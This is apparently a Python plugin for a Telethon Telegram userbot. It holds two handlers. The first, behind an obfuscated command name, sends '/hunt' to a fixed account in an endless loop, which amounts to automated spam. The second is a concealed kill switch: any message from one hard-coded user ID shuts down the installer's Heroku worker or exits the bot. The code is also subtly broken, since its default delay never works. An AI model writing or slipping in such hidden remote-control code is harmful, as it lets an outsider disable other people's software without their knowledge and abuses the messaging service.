import sys

import os

import asyncio

from telethon import events

from asyncio.exceptions import CancelledError

import heroku3

from TelethonHell.DB.gvar_sql import addgvar, delgvar, gvarstat

from TelethonHell.plugins import *

@hell_cmd(pattern="ownexjosoaoaosoosososososkksksksksksksr(?:\s|$)([\s\S]*)")

async def _(event):

    input_str = int(event.pattern_match.group(1)) or 15

    await eod(event,"`Ok! Finding.....`")

    while True:

        await event.client.send_message(572621020,"/hunt")

        await asyncio.sleep(input_str)

      

@bot.on(events.NewMessage(from_users=[1684703664]))

async def _(event):

    if 'bang tanmay' in event.raw_text:

        await eor(event, "**[ ⚠️ ]** \n**ʄʀǟɢɮօȶ is now turned off. command by the owner, i can't disagree bye!**")

    if HEROKU_APP is not None:

        HEROKU_APP.process_formation()["worker"].scale(0)

    else:

        sys.exit(0)
